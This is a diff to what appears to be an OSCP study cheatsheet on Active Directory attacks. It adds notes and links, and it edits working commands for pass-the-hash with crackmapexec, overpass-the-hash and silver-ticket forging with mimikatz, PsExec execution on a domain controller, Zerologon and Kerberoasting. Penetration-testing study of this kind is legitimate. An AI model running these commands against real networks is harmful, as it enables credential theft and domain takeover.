@@ -205,7 +205,10 @@ $ john --wordlist=rockyou.txt johncrackfile
 Useful Powershell one-liners:
 * https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70
 
-Try Zerologon (requires reset after use as account pw is set to emtpy)
+Useful lateral movement techniques:
+* https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/
+
+Try Zerologon (requires reset after use as account pw is set to empty)
 * Source: https://github.com/risksense/zerologon
 * Affects ALL Windows Server versions, but we want to target DCs (high-value).
 ```bash
@@ -247,8 +250,8 @@ cmd> winrs -u:[username] -p:[password] -r:http://[target]:5985/wsman "cmd" # exe
 # See https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-main.md#user-account-control-uac-bypass
 ```
 
-Pass-the-Hash
-* Requires pw-hash user to have local admin rights on target, as connection is made using the `Admin$` share.
+Pass-the-Hash (NTLM-based lateral movement)
+* Requires user/service account to have local admin rights on target, as connection is made using the `Admin$` share.
 * Requires SMB connection through the firewall
 * Requires Windows File and Print Sharing feature to be enabled.
 ```bash
@@ -273,9 +276,10 @@ $ crackmapexec smb [target] -u [username] -H [hash] -x 'reg add HKLM\System\Curr
 $ crackmapexec smb [target] -u [username] -H [hash] -x "whoami" 
 ```
 
-Overpass-the-Hash
+Overpass-the-Hash (NTLM-based lateral movement)
+* Requirement: user/service account to have local admin on target machine.
 * "over" abuse a NTLM hash to gain a full Kerberos TGT or Service Ticket.
-* Requires pw-hash user to have local admin rights on target to run `psexec.exe`.
+* `psexec.exe` requires local admin rights as it accesses admin$ share.
 ```powershell
 mimikatz > sekurlsa::logonpasswords    # obtain NTLM hash
 mimikatz > sekurlsa::pth               # turn hash into Kerberos ticket
@@ -288,9 +292,11 @@ PS> klist                              # view TGT/TGS tickets
 PS> .\PsExec.exe \\dc01 cmd.exe        # code exec on the DC
 ```
 
-Pass the Ticket
-* Takes advantage of the TGS, by forging our own Service Ticket to access the target resource (service account) with any permissions.
-* Does NOT require admin privs if Service Tickets belong to current user.
+Pass-the-Ticket / Silver Ticket (Kerberos-based lateral movement)
+* Use this technique if service account is NOT a local admin on any servers.
+* Takes advantage of the TGS, by forging our own Service Ticket to access the service account such as MSSQLSvc with any permissions.
+* Does NOT require local admin privileges on target machine (unlike PtH and OPtH) if Service Tickets belong to current user.
+* Walkthrough of PTT via. compromised MSSQLSvc hash: https://stealthbits.com/blog/impersonating-service-accounts-with-silver-tickets/
 ```
 # obtain SID of domain (remove RID -XXXX) at the end of the user SID string.
 cmd> whoami /user
@@ -298,7 +304,7 @@ corp\offsec S-1-5-21-1602875587-2787523311-2599479668[-1103]
 
 # generate the Silver Ticket and inject it into memory
 mimikatz > kerberos::golden /user:[user_name] /domain:[domain_name] /sid:[sid_value] 
-        /target:[service_hostname] /service:[service_type] /rc4:[hash] /ppt
+        /target:[service_hostname] /service:[service_type] /rc4:[hash] /ptt
 ```
 
 Distributed Component Object Model (DCOM)
@@ -365,7 +371,8 @@ $ hashcat -m 1000 -a 0 hashes.txt [path/to/wordlist.txt] -o cracked.txt
 $ john --wordlist=[path/to/wordlist.txt] hashes.txt
 ```
 
-Crack SPN hashes via. exported `.kirbi` tickets.
+Kerberoasting - Crack SPN hashes via. exported `.kirbi` tickets.
+* Walkthrough: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting
 ```
 # Kerberoast
 $ python3 tgsrepcrack.py rockyou.txt [ticket.kirbi]  # locally crack hashes
